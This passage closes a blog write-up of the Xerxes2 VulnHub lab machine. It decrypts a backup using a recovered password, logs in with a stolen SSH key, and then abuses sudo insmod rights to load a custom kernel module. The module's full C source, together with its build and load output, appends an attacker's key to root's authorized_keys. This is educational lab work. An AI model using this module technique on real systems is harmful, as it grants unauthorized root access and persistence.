&lt;p&gt;Heh, ok. Easy enough. &lt;code&gt;korenchkin.tar.enc&lt;/code&gt; was encrypted using &lt;code&gt;openssl&lt;/code&gt;. We can simply decrypt this with the &lt;code&gt;-d&lt;/code&gt; flag. From the dump we were able to get the password used too:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out ~/korenchkin.tar

polito@xerxes2:~$ file korenchkin.tar
korenchkin.tar: POSIX tar archive (GNU)

polito@xerxes2:~$ tar xvf korenchkin.tar
.ssh/id_rsa
.ssh/id_rsa.pub
polito@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Extracting &lt;code&gt;korenchkin.tar&lt;/code&gt; revealed a SSH key pair, so to become korenchkin I copied the SSH key to my Kali VM and SSH in as &lt;code&gt;korenchkin&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -i korenchkin.key korenchkin@192.168.56.102

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

You have new mail.
korenchkin@xerxes2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;You have new mail.&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&#34;becoming-root&#34;&gt;becoming root&lt;/h2&gt;

&lt;p&gt;Again, enumeration is key. As &lt;code&gt;korenchkin&lt;/code&gt;, you will see that you may run.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;korenchkin@xerxes2:~$ sudo -l
Matching Defaults entries for korenchkin on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User korenchkin may run the following commands on this host:
    (root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So we may run insmod as &lt;code&gt;root&lt;/code&gt;. Immediately this hints towards the fact that we will need to write a custom kernel module and maybe spawn a shell? And so, we board another educational school bus ride towards kernel module land.&lt;/p&gt;

&lt;p&gt;I confirmed that the kernel-headers were installed for the current kernel. Googling around got me to a sample &amp;ldquo;Hello World!&amp;rdquo; kernel module. This together with a sample &lt;code&gt;Makefile&lt;/code&gt; was working fine. The sources for the files initially tested were:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;linux/module.h&amp;gt;       /* Needed by all modules */
#include &amp;lt;linux/kernel.h&amp;gt;       /* Needed for KERN_INFO */
#include &amp;lt;linux/init.h&amp;gt;         /* Needed for the macros */

static int __init hello_start(void)
{
    printk(KERN_INFO &amp;quot;Loading hello module...\n&amp;quot;);
    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_INFO &amp;quot;Goodbye Mr.\n&amp;quot;);
}

module_init(hello_start);
module_exit(hello_end);
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-make&#34;&gt;obj-m += hello.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I took &lt;code&gt;hello.c&lt;/code&gt; and the &lt;code&gt;Makefile&lt;/code&gt;, put them into a directory, built the module with &lt;code&gt;make&lt;/code&gt;, and loaded it. Once the module loaded I checked the kernel messages via &lt;code&gt;dmesg&lt;/code&gt; to confirm it working:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;
  CC [M]  /home/korenchkin/kern/hello.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/hello.mod.o
  LD [M]  /home/korenchkin/kern/hello.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;

korenchkin@xerxes2:~/kern$ sudo insmod hello.ko

korenchkin@xerxes2:~/kern$ dmesg | tail
[...]
[68192.983366] hello: module license &#39;unspecified&#39; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module...
korenchkin@xerxes2:~/kern$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alrighty, that was, easy! However, this is not really useful. I want command execution! So, what did I do? &lt;code&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/code&gt;, and &lt;code&gt;system()&lt;/code&gt; some commands to run &lt;code&gt;stuff&lt;/code&gt;, getting me a &lt;code&gt;/tmp/getroot&lt;/code&gt; prepared.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;insert loud crash and burn sound here&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Turns out, kernel development is pretty anti command execution. Compiling modules that have stuff like &lt;code&gt;stdio.h&lt;/code&gt; included will fail with headers not found type errors. One can hack the Makefile to include headers from &lt;code&gt;/usr/include&lt;/code&gt;, but it just ends up being a mess. However, there is a handy little function in &lt;code&gt;kmod.h&lt;/code&gt; called &lt;code&gt;call_usermodehelper()&lt;/code&gt;. From the &lt;a href=&#34;https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html&#34;&gt;kernel docs&lt;/a&gt;, &lt;code&gt;call_usermodehelper()&lt;/code&gt; will &lt;em&gt;prepare and start a usermode application&lt;/em&gt;. &lt;strong&gt;That&lt;/strong&gt; sounds pretty handy in our case :)&lt;/p&gt;

&lt;p&gt;So, time to rewrite &lt;code&gt;hello.c&lt;/code&gt; to be useful! Puzzling the pieces together I found on the internet, &lt;a href=&#34;http://stackoverflow.com/questions/7143105/call-usermodehelper-call-usermodehelperpipe-usage&#34;&gt;this&lt;/a&gt; amongst other pieces of information helped get the ball rolling.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#include &amp;lt;linux/module.h&amp;gt;       /* Needed by all modules */
#include &amp;lt;linux/kernel.h&amp;gt;       /* Needed for KERN_INFO */
#include &amp;lt;linux/init.h&amp;gt;         /* Needed for the macros */

/* For our shell ^_^ */
#include&amp;lt;linux/kmod.h&amp;gt;

int get_root (void)
{

    char * envp[] = { &amp;quot;HOME=/&amp;quot;, NULL };
    char *argv[] = { &amp;quot;/bin/bash&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;/bin/cat /tmp/pubkey &amp;gt;&amp;gt; /root/.ssh/authorized_keys&amp;quot;, NULL};
    printk(KERN_INFO &amp;quot;Call Usermodehelper...\n&amp;quot;);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    printk(KERN_INFO &amp;quot;Done usermodehelper...\n&amp;quot;);
    return 0;
}

static int __init hello_start(void)
{
    printk(KERN_INFO &amp;quot;Loading rooted module...\n&amp;quot;);
    return get_root();
    return 0;
}

static void __exit hello_end(void)
{
    printk(KERN_INFO &amp;quot;Goodbye Mr.\n&amp;quot;);
}

module_init(hello_start);
module_exit(hello_end);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As can be seen in the code above, I added a function &lt;code&gt;get_root()&lt;/code&gt;, that will append whatever is in &lt;code&gt;/tmp/pubkey&lt;/code&gt; to &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; using &lt;code&gt;call_usermodehelper&lt;/code&gt;. &lt;code&gt;/tmp/pubkey&lt;/code&gt; contained the public key of the keypair I generated at the beginning of starting Xerxes2. I modified &lt;code&gt;Makefile&lt;/code&gt; to have &lt;code&gt;obj-m += rooted.o&lt;/code&gt; this time, &lt;code&gt;make&lt;/code&gt;&amp;rsquo;d the source and ran the &lt;code&gt;insmod&lt;/code&gt; for the newly build &lt;code&gt;rooted.ko&lt;/code&gt;. Then, I inspected the kernel messages again, and attempted to login as root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;korenchkin@xerxes2:~/kern$ vi rooted.c

korenchkin@xerxes2:~/kern$ vi Makefile

korenchkin@xerxes2:~/kern$ make
make -C /lib/modules/3.2.0-4-686-pae/build M=/home/korenchkin/kern modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;
  CC [M]  /home/korenchkin/kern/rooted.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /home/korenchkin/kern/rooted.mod.o
  LD [M]  /home/korenchkin/kern/rooted.ko
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-686-pae&#39;

korenchkin@xerxes2:~/kern$ echo &amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC6sCFrz036WAchGk66yROuY+hePiULr49D1E97wuK0mK4Uw0J+4u1ngDVw+h8xwtpxPZkOWcn7s86OkXcEkWzGoduC1Y+YMP0XnQFG4hdeX4yNypaAsLKZss6tTHe5kHzbTdiOUthSmiJHwyl39TXibSBILTnMOLaxzLM17xUCfJviRm2mOAq6uELYPPf8thzqVeBoIsdXfjh8QeLMRHloyjGe1ZeY0m4pqwg9d2azaBAirjBMv0cyk+1w51SNR61EQ6SRtc6BE7ayc6C+MZW4TkP/lwOQLH7CXrEoyL3bDskD6c9563jRSLtiVfzjfkjoyUDiTCWv/ThirZMqSot/&amp;quot; &amp;gt; /tmp/pubkey

korenchkin@xerxes2:~/kern$ sudo insmod rooted.ko

korenchkin@xerxes2:~/kern$ dmesg | tail
[   14.512040] eth0: no IPv6 routers present
[  290.023022] Clocksource tsc unstable (delta = 4686567555 ns)
[  290.025022] Switching to clocksource acpi_pm
[57198.109946] bf[25367]: segfault at 40062000 ip 40062000 sp bfc6282c error 14
[68192.983366] hello: module license &#39;unspecified&#39; taints kernel.
[68192.983369] Disabling lock debugging due to kernel taint
[68192.983637] Loading hello module...
[74155.086393] Loading rooted module...
[74155.086397] Call Usermodehelper...
[74155.086449] Done usermodehelper...

korenchkin@xerxes2:~/kern$ logout
Connection to 192.168.56.102 closed.

root@kali:~/Desktop/xeres2# ssh root@192.168.56.102 -i delacroix

Welcome to xerxes2.
      XERXES wishes you
       a pleasant stay.
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

root@xerxes2:~# id
uid=0(root) gid=0(root) groups=0(root)

root@xerxes2:~# cat /root/flag.txt
____   ___  ____  ___  __ ____   ___  ____     ____     ____
`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb
 `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb
  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM
   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39;
   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;
  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;
_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM

    congratulations on beating xerxes2!

    I hope you enjoyed it as much as I did making xerxes2.
    xerxes1 has been described as &#39;weird&#39; and &#39;left-field&#39;
    and I hope that this one fits that description too :)

    Many thanks to @TheColonial &amp;amp; @rasta_mouse for testing!

    Ping me on #vulnhub for thoughts and comments!

                      @barrebas, July 2014
root@xerxes2:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Xerxes2 really challenged me into learning a ton of new things so this Vulnerable VM was a total win for me! Thanks &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; for another great learning opportunity.&lt;/p&gt;

&lt;p&gt;Now, the next step? OSCP :)&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>